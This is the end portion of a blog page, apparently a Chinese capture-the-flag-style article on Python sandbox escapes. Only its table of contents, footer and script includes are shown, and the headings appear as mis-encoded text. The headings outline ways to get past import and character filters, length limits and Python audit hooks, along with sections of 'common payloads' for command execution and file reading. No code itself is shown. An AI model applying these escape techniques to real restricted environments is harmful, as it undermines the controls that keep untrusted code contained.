href="#%E8%BF%87%E6%BB%A4-import"><span class="nav-text">è¿‡æ»¤ import</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#import-1"><span class="nav-text">__import__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#importlib-import-module"><span class="nav-text">importlib.import_module</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#loader-load-module"><span class="nav-text">__loader__.load_module</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86"><span class="nav-text">è¿‡æ»¤äº† []</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#getitem"><span class="nav-text">__getitem__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pop"><span class="nav-text">pop</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-1"><span class="nav-text">è¿‡æ»¤äº† &#39;&#39;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#str-%E5%87%BD%E6%95%B0"><span class="nav-text">str å‡½æ•°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chr-%E5%87%BD%E6%95%B0"><span class="nav-text">chr å‡½æ•°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#list-dict-%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">list + dict æ„é€ ä»»æ„å­—ç¬¦ä¸²</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#doc"><span class="nav-text">__doc__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bytes-%E5%87%BD%E6%95%B0"><span class="nav-text">bytes å‡½æ•°</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-2"><span class="nav-text">è¿‡æ»¤äº† +</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E6%95%B0%E5%AD%97"><span class="nav-text">è¿‡æ»¤äº†æ•°å­—</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC"><span class="nav-text">è¿‡æ»¤äº†ç©ºæ ¼</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="nav-text">è¿‡æ»¤äº†è¿ç®—ç¬¦</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%AD%89%E4%BB%B7%EF%BC%88%E5%80%BC%E7%AD%89%E4%BB%B7%E4%BD%86%E6%97%A0%E7%9F%AD%E8%B7%AF%EF%BC%89"><span class="nav-text">åŸºç¡€ç­‰ä»·ï¼ˆå€¼ç­‰ä»·ä½†æ— çŸ­è·¯ï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E5%80%BC%E2%80%9C%E8%BF%94%E5%9B%9E%E8%AF%AD%E4%B9%89%E2%80%9D%E5%A4%8D%E5%88%BB%EF%BC%88%E7%9F%AD%E8%B7%AF%E5%80%BC%E8%AF%AD%E4%B9%89%EF%BC%89"><span class="nav-text">é€»è¾‘å€¼â€œè¿”å›è¯­ä¹‰â€å¤åˆ»ï¼ˆçŸ­è·¯å€¼è¯­ä¹‰ï¼‰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%9Cnot%E2%80%9D-%E7%9A%84%E6%9B%BF%E4%BB%A3"><span class="nav-text">â€œnotâ€ çš„æ›¿ä»£</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%9C-%E2%80%9D-%E7%9A%84%E6%9B%BF%E4%BB%A3"><span class="nav-text">â€œ&#x3D;&#x3D; &#x2F; !&#x3D;â€ çš„æ›¿ä»£</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E7%9A%84%E7%AD%89%E4%BB%B7"><span class="nav-text">ç»„åˆé€»è¾‘çš„ç­‰ä»·</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E6%9B%BF%E4%BB%A3"><span class="nav-text">å†…ç½®å‡½æ•°æ›¿ä»£</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-3"><span class="nav-text">è¿‡æ»¤äº† ()</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%A3%85%E9%A5%B0%E5%99%A8"><span class="nav-text">åˆ©ç”¨è£…é¥°å™¨ @</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">åˆ©ç”¨é­”æœ¯æ–¹æ³•</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E4%B8%8A%E4%B8%8B%E6%96%87%E7%AE%A1%E7%90%86%E5%99%A8-with"><span class="nav-text">ä½¿ç”¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨ with</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#f-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%A7%E8%A1%8C"><span class="nav-text">f å­—ç¬¦ä¸²æ‰§è¡Œ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87"><span class="nav-text">ååºåˆ—åŒ–ç»•è¿‡</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="nav-text">è¿‡æ»¤äº†å†…å»ºå‡½æ•°</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval-list-dict-%E6%9E%84%E9%80%A0"><span class="nav-text">eval + list + dict æ„é€ </span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-%E5%92%8C-%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0"><span class="nav-text">è¿‡æ»¤äº† . å’Œ , å¦‚ä½•è·å–å‡½æ•°</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unicode-%E7%BB%95%E8%BF%87"><span class="nav-text">unicode ç»•è¿‡</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6"><span class="nav-text">ç»•è¿‡å‘½åç©ºé—´é™åˆ¶</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%83%A8%E5%88%86%E9%99%90%E5%88%B6"><span class="nav-text">éƒ¨åˆ†é™åˆ¶</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E5%85%A8%E9%99%90%E5%88%B6"><span class="nav-text">å®Œå…¨é™åˆ¶</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-object-%E7%B1%BB"><span class="nav-text">è·å– object ç±»</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-object-%E7%9A%84%E5%8F%AF%E7%94%A8%E5%AD%90%E7%B1%BB"><span class="nav-text">è·å– object çš„å¯ç”¨å­ç±»</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#globals-%E4%B8%AD%E7%9A%84%E5%8F%AF%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="nav-text">globals ä¸­çš„å¯ç”¨æ¨¡å—</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins-%E6%A8%A1%E5%9D%97-1"><span class="nav-text">builtins æ¨¡å—</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os-%E6%A8%A1%E5%9D%97-2"><span class="nav-text">os æ¨¡å—</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sys-%E6%A8%A1%E5%9D%97-1"><span class="nav-text">sys æ¨¡å—</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8-payload"><span class="nav-text">å¸¸ç”¨ payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1"><span class="nav-text">å‘½ä»¤æ‰§è¡Œ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-text">æ–‡ä»¶è¯»å–</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%A4%9A%E8%A1%8C%E9%99%90%E5%88%B6"><span class="nav-text">ç»•è¿‡å¤šè¡Œé™åˆ¶</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#exec"><span class="nav-text">exec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#compile"><span class="nav-text">compile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%B7%E8%B1%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-text">æµ·è±¡è¡¨è¾¾å¼</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="nav-text">ç»•è¿‡é•¿åº¦é™åˆ¶</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0%E5%90%8D%E7%A7%B0"><span class="nav-text">æ›¿æ¢å‡½æ•°åç§°</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%93%E5%BC%80-input-%E8%BE%93%E5%85%A5"><span class="nav-text">æ‰“å¼€ input è¾“å…¥</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sys-stdin-read"><span class="nav-text">sys.stdin.read()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sys-stdin-readline"><span class="nav-text">sys.stdin.readline()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sys-stdin-readlines"><span class="nav-text">sys.stdin.readlines()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#breakpoint-%E5%87%BD%E6%95%B0"><span class="nav-text">breakpoint å‡½æ•°</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#help-%E5%87%BD%E6%95%B0-1"><span class="nav-text">help å‡½æ•°</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-audit-hook"><span class="nav-text">ç»•è¿‡ audit hook</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%9F%BA%E4%BA%8E-sys-addaudithook-%E7%9A%84-audit-hook"><span class="nav-text">ç»•è¿‡åŸºäº sys.addaudithook çš„ audit hook</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#loader-load-module-1"><span class="nav-text">__loader__.load_module</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#posixsubprocess-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">_posixsubprocess æ‰§è¡Œå‘½ä»¤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AF%A1%E6%94%B9%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-text">ç¯¡æ”¹å†…ç½®å‡½æ•°</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%9C%81%E6%9C%BA%E5%88%B6%E6%9F%A5%E8%AF%A2%E6%A8%A1%E5%9D%97"><span class="nav-text">å†…çœæœºåˆ¶æŸ¥è¯¢æ¨¡å—</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%9F%BA%E4%BA%8E-CPython-%E7%9A%84-audit-hook"><span class="nav-text">ç»•è¿‡åŸºäº CPython çš„ audit hook</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-ctypes-%E8%A6%86%E7%9B%96-audit-hook"><span class="nav-text">åˆ©ç”¨ ctypes è¦†ç›– audit hook</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#audit-hook-%E7%BB%93%E6%9E%84"><span class="nav-text">audit hook ç»“æ„</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PyRuntimeState"><span class="nav-text">_PyRuntimeState</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PyInterpreterState"><span class="nav-text">PyInterpreterState</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-audit-hook-%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="nav-text">è·å– audit hook å‡½æ•°åœ°å€</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A6%86%E7%9B%96-audit-hook"><span class="nav-text">è¦†ç›– audit hook</span></a></li></ol></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        57 posts in total
                    </span>
                    
                        <span>
                            1173.9k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="åœ–å±¤_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>